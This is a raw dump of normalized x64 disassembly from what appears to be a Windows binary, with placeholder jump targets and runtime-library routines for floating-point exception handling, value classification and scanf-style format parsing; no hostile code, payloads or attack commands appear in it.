mov [ rax + 0x50 ] rdx
mov rax [ rbp + 0x10 ]
mov edx 0xffffffe1
and [ rax + 0x20 ] edx
mov rax [ rbp + 0x30 ]
mov ecx [ rax ]
mov rax [ rbp + 0x10 ]
mov [ rax + 0x10 ] ecx
mov rax [ rbp + 0x10 ]
or [ rax + 0x60 ] 0x1
mov rax [ rbp + 0x10 ]
and [ rax + 0x60 ] edx
mov rax [ rbp + 0x10 ]
mov ecx [ rsi ]
mov [ rax + 0x50 ] ecx
jmp r-xdata
mov rax [ rbp + 0x10 ]
and [ rax ] 0xfffffffd
mov rax [ rbp + 0x10 ]
or [ rax ] 0x1
jmp r-xdata
cmp rax 0x4000
je r-xdata
test [ r11 + 0x8 ] 0x8
je r-xdata
btr [ rbx ] 0x7
call sub_14004a4cc
xor edx edx
lea r9 [ rbp + 0x10 ]
lea r8d [ rdx + 0x1 ]
mov ecx edi
call [ RaiseException@IAT ]
mov r11 [ rbp + 0x10 ]
test [ r11 + 0x8 ] 0x10
je r-xdata
mov rax [ rbp + 0x10 ]
and esi 0xfff
and [ rax ] 0xfffe001f
mov rax [ rbp + 0x10 ]
shl esi 0x5
or [ rax ] esi
mov rax [ rbp + 0x10 ]
mov rsi [ rbp + 0x38 ]
or [ rax + 0x20 ] 0x1
cmp [ rbp + 0x40 ] 0x0
je r-xdata
mov rax [ rbp + 0x10 ]
and [ rax ] 0xfffffffe
mov rax [ rbp + 0x10 ]
or [ rax ] 0x2
jmp r-xdata
cmp rax rcx
jne r-xdata
test [ r11 + 0x8 ] 0x4
je r-xdata
btr [ rbx ] 0x9
mov rax [ rbp + 0x10 ]
or [ rax ] 0x3
jmp r-xdata
test [ r11 + 0x8 ] 0x2
je r-xdata
btr [ rbx ] 0xa
test [ r11 + 0x8 ] 0x1
je r-xdata
btr [ rbx ] 0xb
mov eax [ r11 ]
and eax 0x3
je r-xdata
btr [ rbx ] 0xc
and [ rbx ] 0xffffffffffff9fff
dec eax
je r-xdata
mov rax [ r11 + 0x50 ]
mov [ rsi ] rax
mov eax [ r11 + 0x50 ]
mov [ rsi ] eax
jmp r-xdata
btr [ rbx ] 0xe
bts [ rbx ] 0xd
jmp r-xdata
dec eax
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop rbp
retn
cmp [ rbp + 0x40 ] 0x0
je r-xdata
btr [ rbx ] 0xd
bts [ rbx ] 0xe
jmp r-xdata
dec eax
jne r-xdata
or [ rbx ] 0x6000
jmp r-xdata
sub_140049d70
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
xor ebp ebp
mov ebx ecx
movaps [ rsp + 0x20 ] xmm6
and ebx 0x1f
mov r13 r8
mov rsi rdx
mov r14d ecx
lea r15d [ rbp + 0x10 ]
test cl 0x8
je r-xdata
mov ecx 0x4
test cl r14b
je r-xdata
test r8b r8b
jns r-xdata
mov edi 0x1
test dil r14b
je r-xdata
bt r8 0x9
jae r-xdata
lea ecx [ rbp + 0x1 ]
call sub_14004a568
and ebx 0xfffffff7
jmp r-xdata
test r14b 0x2
je r-xdata
bt r8 0xa
jae r-xdata
call sub_14004a568
and ebx 0xfffffffb
jmp r-xdata
test r15b r14b
je r-xdata
bt r8 0xb
jae r-xdata
lea ecx [ rdi + 0x7 ]
call sub_14004a568
mov r11 r13
mov eax 0x6000
and r11 rax
je r-xdata
movaps xmm6 [ rsp + 0x20 ]
test ebx ebx
mov rbx [ rsp + 0x78 ]
sete bpl
mov eax ebp
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
bt r13 0xc
jae r-xdata
movsd xmm0 [ rdx ]
xorpd xmm6 xmm6
test r15b r14b
mov r12d ebp
cmovne r12d edi
ucomisd xmm0 xmm6
jpe r-xdata
movsd xmm0 [ rsi ]
comisd xmm0 [ r--data ]
jbe r-xdata
cmp r11 0x2000
je r-xdata
mov ecx 0x20
call sub_14004a568
and ebx 0xffffffef
lea rdx [ rsp + 0x70 ]
call sub_14004a378
mov ecx [ rsp + 0x70 ]
add ecx 0xfffffa00
movsd [ rsp + 0x88 ] xmm0
cmp ecx 0xfffffbce
jge r-xdata
jne r-xdata
movsd xmm0 [ rw-data ]
movsd xmm0 [ rw-data ]
jmp r-xdata
movsd xmm0 [ rsi ]
comisd xmm0 [ r--data ]
jbe r-xdata
cmp r11 0x4000
je r-xdata
comisd xmm6 xmm0
mov edx edi
ja r-xdata
mulsd xmm0 xmm6
mov r12d edi
jmp r-xdata
mov r12d edi
jmp r-xdata
movsd [ rsi ] xmm0
movsd xmm0 [ rw-data ]
jmp r-xdata
movsd xmm0 [ rsi ]
comisd xmm0 [ r--data ]
ja r-xdata
cmp r11 rax
jne r-xdata
mov rax [ rsp + 0x88 ]
shr rax 0x30
and ax 0xf
or ax r15w
mov [ rsp + 0x8e ] ax
cmp ecx 0xfffffc03
jge r-xdata
mov edx ebp
movsd [ rsi ] xmm0
test r12d r12d
je r-xdata
movsd xmm0 [ rw-data ]
jmp r-xdata
and ebx 0xfffffffe
jmp r-xdata
movsd xmm0 [ rsi ]
comisd xmm0 [ r--data ]
movsd xmm0 [ rw-data ]
ja r-xdata
movsd xmm0 [ rsp + 0x88 ]
test edx edx
je r-xdata
mov eax [ rsp + 0x88 ]
mov r8d 0xfffffc03
sub r8d ecx
mov ecx [ rsp + 0x8c ]
and ebx 0xfffffffd
mov rcx r15
call sub_14004a568
xorpd xmm0 [ r--data ]
jmp r-xdata
xorpd xmm0 [ r--data ]
shr eax 0x1
mov [ rsp + 0x88 ] eax
test dil cl
je r-xdata
test r12d r12d
cmove r12d edi
shr ecx 0x1
sub r8 rdi
jne r-xdata
bts eax 0x1f
mov [ rsp + 0x88 ] eax
test dil al
je r-xdata
mov [ rsp + 0x8c ] ecx
sub_140049fdc
sub rsp 0x28
cmp ecx 0x1
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x21
jle r-xdata
add rsp 0x28
retn
cmp ecx 0x3
jg r-xdata
call sub_14003f1a4
mov [ rax ] 0x22
jmp r-xdata
sub_14004a00c
mov eax ecx
test cl 0x20
je r-xdata
test al 0x8
je r-xdata
mov ecx 0x5
jmp r-xdata
test al 0x4
je r-xdata
mov ecx 0x1
jmp r-xdata
mov eax ecx
retn
mov ecx 0x1
test cl al
je r-xdata
mov ecx 0x2
jmp r-xdata
movzx eax al
mov ecx 0x2
and ecx eax
add ecx ecx
mov ecx 0x3
jmp r-xdata
sub_14004a050
movsd [ rsp + 0x20 ] xmm3
movsd [ rsp + 0x18 ] xmm2
push rbx
sub rsp 0x50
lea r9 [ rw-data ]
mov ebx ecx
xor r8d r8d
mov rax r9
movsxd rax r8d
add rax rax
mov rax [ r9 + rax * 8 + 0x8 ]
lea rcx [ rw-data ]
add rax 0x10
inc r8d
cmp rax rcx
jl r-xdata
call sub_14004a4ec
mov ecx ebx
call sub_140049fdc
movsd xmm0 [ rsp + 0x80 ]
mov eax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] ebx
mov [ rsp + 0x30 ] eax
mov eax [ rsp + 0x74 ]
mov [ rsp + 0x34 ] eax
mov eax [ rsp + 0x78 ]
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0x7c ]
mov [ rsp + 0x3c ] eax
mov eax [ rsp + 0x80 ]
mov [ rsp + 0x40 ] eax
mov eax [ rsp + 0x84 ]
mov [ rsp + 0x44 ] eax
call sub_14004a4ec
lea rcx [ rsp + 0x20 ]
call sub_140051a44
test eax eax
jne r-xdata
cmp [ rax ] edx
je r-xdata
xor eax eax
jmp r-xdata
movsd xmm0 [ rsp + 0x40 ]
jmp r-xdata
mov ecx ebx
call sub_140049fdc
mov rcx [ rsp + 0x88 ]
mov [ rsp + 0x28 ] rax
mov edx 0xffc0
test rax rax
je r-xdata
add rsp 0x50
pop rbx
retn
sub_14004a124
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movaps [ rsp + 0x30 ] xmm6
movapd xmm6 xmm1
addsd xmm6 xmm2
mov rbx r9
jne r-xdata
call sub_14003f1a4
mov edx 0xffc0
mov rcx rbx
mov [ rax ] 0x21
call sub_14004a4ec
movapd xmm0 xmm6
movapd xmm3 xmm2
mov edx ecx
movapd xmm2 xmm1
mov ecx 0x1
mov [ rsp + 0x28 ] rbx
movsd [ rsp + 0x20 ] xmm6
call sub_14004a050
jmp r-xdata
movaps xmm6 [ rsp + 0x30 ]
add rsp 0x40
pop rbx
retn
sub_14004a18c
mov rax rsp
mov [ rax + 0x10 ] rbx
push rbp
push rsi
push rdi
lea rbp [ rax - 0x4f ]
sub rsp 0xf0
movaps [ rax - 0x28 ] xmm6
movaps [ rax - 0x38 ] xmm7
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x7 ] rax
mov rbx [ rbp + 0x7f ]
mov esi edx
lea rdx [ rbp + 0x77 ]
movsd [ rbp - 0x79 ] xmm2
movapd xmm6 xmm3
movapd xmm7 xmm2
mov r8 rbx
mov edi ecx
call sub_140049d70
test eax eax
jne r-xdata
mov ecx edi
call sub_14004a00c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rbp - 0x29 ]
and [ rsp + 0x30 ] 0x0
lea rdx [ rbp + 0x7f ]
movsd [ rbp - 0x39 ] xmm6
and eax 0xffffffe3
lea rcx [ rbp - 0x69 ]
mov r9d esi
or eax 0x3
mov r8d edi
mov [ rbp - 0x29 ] eax
lea rax [ rbp + 0x77 ]
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x79 ]
mov [ rsp + 0x20 ] rax
call sub_140049a64
mov rbx [ rbp + 0x7f ]
mov ecx eax
call sub_140049fdc
mov edx 0xffc0
mov rcx rbx
call sub_14004a4ec
movsd xmm0 [ rbp + 0x77 ]
test eax eax
je r-xdata
movsd xmm0 [ rbp + 0x77 ]
movapd xmm3 xmm6
movapd xmm2 xmm7
mov edx esi
mov ecx eax
mov [ rsp + 0x28 ] rbx
movsd [ rsp + 0x20 ] xmm0
call sub_14004a050
jmp r-xdata
mov rcx [ rbp + 0x7 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xf0 ]
mov rbx [ r11 + 0x28 ]
movaps xmm6 [ r11 - 0x10 ]
movaps xmm7 [ r11 - 0x20 ]
mov rsp r11
pop rdi
pop rsi
pop rbp
retn
sub_14004a2cc
movsd [ rsp + 0x8 ] xmm0
mov rax [ rsp + 0x8 ]
mov ecx 0x800f
shr rax 0x30
movsd [ rsp + 0x18 ] xmm0
and ax cx
mov ecx 0x3fe
add dx cx
shl dx 0x4
or ax dx
mov [ rsp + 0x1e ] ax
movsd xmm0 [ rsp + 0x18 ]
retn
sub_14004a304
movsd [ rsp + 0x8 ] xmm0
mov rax [ rsp + 0x8 ]
mov rcx rax
shr rcx 0x20
cmp ecx 0x7ff00000
jne r-xdata
cmp ecx 0xfff00000
jne r-xdata
test eax eax
jne r-xdata
mov r8d 0x7ff8
mov rdx rax
shr rdx 0x30
and dx r8w
cmp dx r8w
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x1
retn
mov r8d 0x7ff0
cmp dx r8w
jne r-xdata
mov eax 0x3
retn
mov eax 0x2
retn
xor eax eax
retn
test ecx 0x7ffff
jne r-xdata
mov eax 0x4
retn
test eax eax
je r-xdata
sub_14004a378
movapd xmm1 xmm0
movsd [ rsp + 0x8 ] xmm0
xorpd xmm0 xmm0
mov r10 rdx
ucomisd xmm1 xmm0
jpe r-xdata
mov rax [ rsp + 0x8 ]
mov ecx 0x7ff0
mov rdx rax
shr rdx 0x30
test cx dx
jne r-xdata
jne r-xdata
mov ecx 0xbfef
movsd [ rsp + 0x10 ] xmm1
movsd [ rsp + 0x18 ] xmm1
mov rax [ rsp + 0x18 ]
shr rax 0x30
and ax cx
mov ecx 0x3fe0
or ax cx
mov ecx 0x7ff
mov [ rsp + 0x16 ] ax
movzx eax [ rsp + 0xe ]
shr ax 0x4
movsd xmm0 [ rsp + 0x10 ]
and ax cx
movsx r8d ax
sub r8d 0x3fe
mov ecx [ rsp + 0x8 ]
shr rax 0x20
test eax 0xfffff
jne r-xdata
xor r8d r8d
jmp r-xdata
comisd xmm0 xmm1
mov r8d 0xfffffc03
jbe r-xdata
test ecx ecx
je r-xdata
mov [ r10 ] r8d
retn
xor r9d r9d
mov r9d 0x1
jmp r-xdata
movzx eax [ rsp + 0xe ]
mov ecx 0xffef
and ax cx
mov [ rsp + 0xe ] ax
test r9d r9d
je r-xdata
mov eax [ rsp + 0xc ]
test dl 0x10
jne r-xdata
movsd xmm0 [ rsp + 0x8 ]
mov ecx 0xbfef
movsd [ rsp + 0x10 ] xmm0
movsd [ rsp + 0x8 ] xmm0
mov rax [ rsp + 0x10 ]
shr rax 0x30
and ax cx
mov ecx 0x3fe0
or ax cx
mov [ rsp + 0xe ] ax
movsd xmm0 [ rsp + 0x8 ]
jmp r-xdata
mov ecx 0x8000
or ax cx
mov [ rsp + 0xe ] ax
add ecx ecx
dec r8d
test [ rsp + 0xe ] 0x10
je r-xdata
or eax 0x1
mov [ rsp + 0xc ] eax
add eax eax
mov [ rsp + 0xc ] eax
test ecx ecx
jns r-xdata
mov [ rsp + 0x8 ] ecx
sub_14004a4ec
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_140051a60
mov esi eax
mov [ rsp + 0x38 ] eax
mov ecx ebx
not ecx
or ecx 0xffff807f
and ecx eax
and edi ebx
or ecx edi
mov [ rsp + 0x30 ] ecx
cmp [ rw-data ] 0x0
je r-xdata
and ecx 0xffffffbf
call sub_140051a70
test cl 0x40
je r-xdata
call sub_140051a70
jmp r-xdata
jmp r-xdata
mov eax esi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
sub_14004a588
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi r9
mov rdi r8
mov rbx rdx
cmp rcx [ rdx ]
jne r-xdata
mov eax 0x1
cmp [ r8 ] r9
jne r-xdata
mov rdx [ rdx ]
mov rcx [ rdi ]
mov r8d 0x2
call sub_140041810
test rax rax
je r-xdata
mov rcx [ rbx ]
mov edx 0x2
call sub_140041704
mov [ rdi ] rax
test rax rax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rdi ] rax
mov rcx [ rbx ]
add rcx rcx
mov [ rbx ] rcx
mov rax [ rsp + 0x50 ]
mov rdx rsi
mov [ rax ] 0x1
mov r8 [ rbx ]
mov rcx [ rdi ]
call sub_14003a8c0
mov r11 [ rbx ]
add r11 r11
mov [ rbx ] r11
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_14004a620
sub rsp 0x28
dec [ rcx + 0x8 ]
js r-xdata
call sub_140043e10
mov edx eax
mov rax [ rcx ]
movzx edx [ rax ]
inc rax
mov [ rcx ] rax
jmp r-xdata
mov eax edx
add rsp 0x28
retn
sub_14004a648
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x180 ]
sub rsp 0x280
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x170 ] rax
xor r14d r14d
lea r13 [ rbp + 0x10 ]
mov [ rbp - 0x48 ] r9
mov rbx r8
mov rsi rdx
mov [ rsp + 0x70 ] rdx
mov [ rsp + 0x78 ] r13
mov r12 rcx
mov [ rsp + 0x60 ] rcx
mov [ rbp - 0x58 ] 0x15e
mov [ rbp - 0x78 ] r14d
mov [ rbp - 0x80 ] r14w
mov edi r14d
mov [ rsp + 0x3c ] r14d
mov [ rsp + 0x44 ] r14d
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
or r15d 0xffffffff
test [ rcx + 0x18 ] 0x40
jne r-xdata
mov rcx [ rbp + 0x170 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x2d0 ]
add rsp 0x280
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea rcx [ rbp - 0x30 ]
mov rdx rbx
call sub_14003b928
mov al [ rsi ]
xor ecx ecx
mov [ rsp + 0x39 ] r14b
mov [ rsp + 0x34 ] r14d
mov ebx ecx
mov [ rsp + 0x68 ] ecx
test al al
je r-xdata
call sub_14003be60
lea rdx [ rw-data ]
lea r9 [ rw-data ]
cmp eax r15d
je r-xdata
cmp [ rbp - 0x18 ] cl
je r-xdata
lea r13d [ rcx + 0x1 ]
mov r8 rdx
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov rax [ rbp - 0x20 ]
and [ rax + 0xc8 ] 0xfffffffd
mov cl 0x25
cmp [ rsi ] cl
jne r-xdata
sub r14d r13d
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp eax r15d
je r-xdata
movsxd r8 eax
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 ]
jmp r-xdata
add r14d r13d
mov rcx r12
mov [ rsp + 0x34 ] r14d
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
movzx eax [ rsi ]
add rsi r13
mov [ rsp + 0x70 ] rsi
cmp eax edi
jne r-xdata
cmp [ rsi + 0x1 ] cl
je r-xdata
add rsi r13
movzx ecx [ rsi ]
call sub_14003e654
test eax eax
jne r-xdata
movzx ecx al
call sub_14003e654
test eax eax
jne r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
cmp edi r15d
je r-xdata
movzx ecx dil
call sub_14004fd00
test eax eax
je r-xdata
cmp [ rsi ] cl
jne r-xdata
mov r14 [ rsp + 0x70 ]
mov edx 0x1
mov [ rsp + 0x5c ] ebx
mov [ rsp + 0x38 ] dl
mov [ rbp - 0x7c ] bl
mov [ rsp + 0x58 ] ebx
mov [ rsp + 0x50 ] ebx
mov r13d ebx
mov [ rbp - 0x40 ] rbx
mov [ rsp + 0x54 ] bl
mov [ rsp + 0x40 ] bl
mov [ rsp + 0x30 ] bl
mov sil bl
mov [ rbp - 0x5c ] bl
mov r12b bl
mov edi ebx
mov r12 [ rsp + 0x60 ]
mov [ rsp + 0x70 ] rsi
xor ebx ebx
jmp r-xdata
add r14d r13d
mov rcx r12
mov [ rsp + 0x34 ] r14d
call sub_14004a620
mov ebx eax
cmp eax r15d
je r-xdata
mov rdx r12
mov ecx ebx
call sub_140042504
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 ]
mov r13d [ rsp + 0x44 ]
mov rdx r12
jmp r-xdata
cmp edi r15d
jne r-xdata
mov rcx r12
call sub_14004a620
movzx ecx [ rsi ]
add rsi r13
mov [ rsp + 0x70 ] rsi
cmp ecx eax
jne r-xdata
lea rax [ rsi + 0x1 ]
cmp [ rax ] cl
cmove rsi rax
cmp ebx 0x2a
je r-xdata
lea eax [ r13 + r13 * 4 ]
lea edx [ r9 + 0x1 ]
add [ rsp + 0x50 ] edx
lea r13d [ rbx + rax * 2 - 0x30 ]
jmp r-xdata
mov al [ rsi ]
test al al
je r-xdata
cmp edi r15d
jne r-xdata
mov rcx [ rsp + 0x78 ]
call sub_14003ad04
mov ecx edi
call sub_140042504
jmp r-xdata
cmp [ rsi ] 0x25
jne r-xdata
cmp eax r15d
je r-xdata
mov cl [ rsp + 0x30 ]
mov edx 0x1
add cl dl
mov [ rsp + 0x30 ] cl
jmp r-xdata
cmp ebx 0x46
je r-xdata
mov cl [ rsp + 0x30 ]
jmp r-xdata
cmp r13d 0x1
jne r-xdata
mov eax [ rsp + 0x68 ]
test eax eax
jne r-xdata
cmp [ rsi + 0x1 ] 0x6e
jne r-xdata
mov rdx r12
mov ecx eax
call sub_140042504
test sil sil
je r-xdata
mov edx 0x1
cmp ebx 0x49
je r-xdata
add r14 rdx
movzx ebx [ r14 ]
mov ecx ebx
call sub_14003e550
xor r9d r9d
test eax eax
je r-xdata
mov [ rsp + 0x4c ] edi
mov edi [ rsp + 0x3c ]
mov [ rsp + 0x70 ] r14
mov r14b [ rbp - 0x7c ]
mov [ rsp + 0x48 ] r13d
test cl cl
jne r-xdata
movzx ecx al
call sub_14003e654
test eax eax
je r-xdata
mov ebx [ rsp + 0x68 ]
xor ecx ecx
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rbp - 0x18 ] r12b
je r-xdata
mov r15d eax
mov dl [ rsp + 0x39 ]
test dl dl
je r-xdata
mov al [ r14 + 0x1 ]
cmp al 0x36
jne r-xdata
cmp ebx 0x4c
je r-xdata
mov [ rbp - 0x68 ] r9
mov rax [ rbp - 0x48 ]
mov [ rbp - 0x50 ] rax
add rax 0x8
mov [ rbp - 0x48 ] rax
mov rax [ rax - 0x8 ]
mov [ rbp - 0x68 ] rax
jmp r-xdata
mov eax [ rsp + 0x68 ]
jmp r-xdata
mov rcx [ rbp - 0x20 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov eax r15d
jmp r-xdata
mov rcx [ rbp - 0x20 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rbp - 0x18 ] r12b
je r-xdata
cmp al 0x33
jne r-xdata
lea rcx [ r14 + 0x2 ]
cmp [ rcx ] 0x34
jne r-xdata
mov edx 0x1
add [ rsp + 0x38 ] dl
jmp r-xdata
cmp ebx 0x4e
je r-xdata
movzx r13d [ r10 ]
or r13d 0x20
mov [ rbp - 0x38 ] r13d
cmp r13d 0x6e
je r-xdata
cmp [ r10 ] 0x53
je r-xdata
mov r10 [ rsp + 0x70 ]
mov bl r9b
test r12b r12b
jne r-xdata
cmp al 0x64
je r-xdata
lea rcx [ r14 + 0x2 ]
cmp [ rcx ] 0x32
jne r-xdata
mov r14 rcx
cmp ebx 0x68
je r-xdata
mov eax [ rsp + 0x50 ]
mov esi [ rsp + 0x48 ]
test eax eax
je r-xdata
cmp r13d 0x63
je r-xdata
mov r12b dl
cmp [ r10 ] 0x43
mov r12b r15b
jne r-xdata
mov edx 0x1
jmp r-xdata
cmp al 0x69
je r-xdata
mov r14 rcx
jmp r-xdata
add edi edx
mov [ rbp - 0x70 ] r9
jmp r-xdata
add [ rsp + 0x38 ] r15b
add r12b r15b
mov edx 0x1
cmp ebx 0x6c
je r-xdata
test cl cl
jne r-xdata
test esi esi
je r-xdata
mov rcx [ rsp + 0x60 ]
add [ rsp + 0x34 ] edx
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
cmp r13d 0x7b
je r-xdata
cmp al 0x6f
je r-xdata
cmp [ r14 + 0x1 ] 0x6c
jne r-xdata
cmp ebx 0x77
je r-xdata
mov r8 [ rbp - 0x50 ]
mov edx 0x1
cmp r13d 0x63
je r-xdata
cmp edi r15d
je r-xdata
mov r10 [ rsp + 0x70 ]
mov cl [ rsp + 0x30 ]
xor r9d r9d
mov rsi [ rsp + 0x60 ]
mov r13d [ rsp + 0x34 ]
cmp al 0x78
je r-xdata
add [ rsp + 0x38 ] dl
inc r14
add r12b dl
jmp r-xdata
jmp r-xdata
cmp r13d 0x70
je r-xdata
je r-xdata
mov rax [ rbp - 0x50 ]
mov edx 0x1
mov rcx [ rax ]
add rax 0x8
mov r8 rax
mov [ rbp - 0x50 ] rax
add rax 0x8
mov [ rbp - 0x48 ] rax
mov eax [ rax - 0x8 ]
mov [ rbp - 0x68 ] rcx
mov [ rbp - 0x40 ] rax
cmp rax rdx
jb r-xdata
cmp r13d 0x73
je r-xdata
mov rdx [ rsp + 0x60 ]
mov [ rsp + 0x34 ] r13d
mov r13d [ rbp - 0x38 ]
jmp r-xdata
movzx ecx al
call sub_14003e654
mov edx 0x1
test eax eax
jne r-xdata
cmp al 0x58
je r-xdata
add sil dl
jmp r-xdata
mov r14d [ rsp + 0x4c ]
mov [ rsp + 0x38 ] dl
mov [ rbp - 0x70 ] r9
add r14d edx
jmp r-xdata
cmp r13d 0x73
je r-xdata
mov r14d [ rsp + 0x4c ]
cmp r13d 0x63
je r-xdata
test r12b r12b
jle r-xdata
mov eax [ rsp + 0x50 ]
mov cl [ rsp + 0x30 ]
jmp r-xdata
cmp r13d 0x7b
jne r-xdata
cmp edi r15d
je r-xdata
mov rcx rsi
add r13d edx
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
cmp eax r15d
je r-xdata
mov edx 0x1
mov [ rbp - 0x70 ] r9
add edi edx
cmp edi 0x2d
jne r-xdata
movzx esi [ rbp - 0x5c ]
test r12b r12b
cmovg esi edx
jmp r-xdata
cmp r13d 0x75
je r-xdata
cmp edi 0x2b
jne r-xdata
mov [ rsp + 0x40 ] dl
jmp r-xdata
test eax eax
jne r-xdata
cmp r13d 0x64
je r-xdata
mov [ rcx ] r9b
mov [ rcx ] r9w
jmp r-xdata
cmp r13d 0x6f
jg r-xdata
mov edx [ rsp + 0x34 ]
mov rbx [ rbp - 0x68 ]
mov r8d 0x1
sub edx r8d
mov [ rsp + 0x34 ] edx
cmp edi r15d
je r-xdata
cmp r13d 0x78
je r-xdata
test r14d r14d
je r-xdata
sub esi edx
mov [ rsp + 0x48 ] esi
jne r-xdata
test r12b r12b
jle r-xdata
add esi edx
mov [ rsp + 0x50 ] edx
mov [ rsp + 0x48 ] esi
jle r-xdata
call sub_14003f1a4
mov [ rax ] 0xc
jmp r-xdata
mov r12 [ rbp - 0x40 ]
cmp r13d 0x63
je r-xdata
mov rdx [ rsp + 0x60 ]
mov ecx edi
call sub_140042504
mov edx [ rsp + 0x34 ]
mov r8d 0x1
cmp edi 0x2d
jne r-xdata
cmp r13d 0x7b
je r-xdata
mov esi [ rsp + 0x5c ]
test bl bl
jne r-xdata
mov rsi [ rbp - 0x70 ]
test bl bl
jne r-xdata
mov rcx [ rsp + 0x60 ]
add [ rsp + 0x34 ] edx
call sub_14004a620
xor r9d r9d
mov edi eax
mov [ rsp + 0x3c ] eax
jmp r-xdata
test eax eax
je r-xdata
mov esi [ rbp - 0x5c ]
mov sil dl
jmp r-xdata
movzx eax [ r10 ]
cmp eax edi
jne r-xdata
cmp r13d 0x67
jle r-xdata
mov r14b [ rsp + 0x54 ]
sub r12 r8
cmp edi 0x2b
jne r-xdata
mov [ rsp + 0x40 ] dl
jmp r-xdata
mov esi [ rbp - 0x5c ]
test r12b r12b
movzx esi sil
cmovg esi edx
add r10 rdx
cmp [ r10 ] 0x5e
mov [ rsp + 0x70 ] r10
jne r-xdata
cmp [ rsp + 0x40 ] r9b
je r-xdata
mov r12d [ rsp + 0x48 ]
mov rbx [ rsp + 0x60 ]
cmp [ rsp + 0x40 ] r9b
je r-xdata
mov r12d [ rsp + 0x48 ]
mov rbx [ rsp + 0x60 ]
mov bl dl
jmp r-xdata
cmp edi r15d
je r-xdata
mov dl [ rsp + 0x39 ]
mov r14d [ rsp + 0x34 ]
add dl r15b
mov [ rsp + 0x39 ] dl
test cl cl
jne r-xdata
mov rbx r9
cmp edi 0x2d
jne r-xdata
cmp r13d 0x69
je r-xdata
mov rcx [ rsp + 0x60 ]
add edx r8d
mov [ rsp + 0x34 ] edx
call sub_14004a620
movsxd rdi eax
mov [ rsp + 0x3c ] edi
cmp edi r15d
je r-xdata
mov ecx [ rsp + 0x48 ]
mov eax ecx
sub ecx r8d
mov [ rsp + 0x48 ] ecx
test eax eax
je r-xdata
mov r14d [ rsp + 0x34 ]
mov r12 [ rsp + 0x60 ]
sub esi edx
mov [ rsp + 0x48 ] esi
jne r-xdata
xor edx edx
lea rcx [ rbp - 0x10 ]
lea r8d [ rdx + 0x20 ]
call sub_14003d760
mov r10 [ rsp + 0x70 ]
mov bl 0x5d
mov r11d 0x1
cmp [ r10 ] bl
jne r-xdata
inc r10
mov [ rsp + 0x54 ] r15b
mov [ rsp + 0x70 ] r10
mov eax [ rsp + 0x58 ]
cmp r13d 0x46
cmove eax r9d
test eax eax
je r-xdata
neg esi
mov [ rsp + 0x5c ] esi
movzx esi dil
mov ecx esi
call sub_14003e5d0
xor r9d r9d
test eax eax
je r-xdata
cmp r13d 0x70
je r-xdata
neg rsi
mov [ rbp - 0x70 ] rsi
jmp r-xdata
movzx esi dil
mov ecx esi
call sub_14003e5d0
xor r9d r9d
test eax eax
je r-xdata
cmp r13d 0x70
je r-xdata
mov r13d 0x1
jmp r-xdata
mov rdx [ rsp + 0x60 ]
mov ecx edi
call sub_140042504
mov rsi [ rsp + 0x70 ]
mov r12 [ rsp + 0x60 ]
mov r13d 0x1
add [ rsp + 0x39 ] r13b
add rsi r13
xor ebx ebx
mov [ rsp + 0x70 ] rsi
jmp r-xdata
mov [ rbp - 0x48 ] r8
jmp r-xdata
cmp edi 0x2b
jne r-xdata
mov rax [ rsp + 0x78 ]
mov rbx rdx
mov [ rax ] dil
jmp r-xdata
mov r13d 0x64
cmp r13d 0x6e
jne r-xdata
mov r14d [ rsp + 0x34 ]
mov r8d 0x1
sub r14d r8d
mov [ rsp + 0x34 ] r14d
cmp edi r15d
je r-xdata
cmp r13d 0x63
je r-xdata
mov r14d [ rsp + 0x34 ]
jmp r-xdata
mov r14d [ rsp + 0x4c ]
inc r14d
mov rcx r12
mov [ rsp + 0x34 ] r14d
call sub_14004a620
mov edi eax
mov [ rsp + 0x3c ] eax
cmp al 0x78
je r-xdata
mov r14d [ rsp + 0x34 ]
mov r12 [ rsp + 0x60 ]
add r14d edx
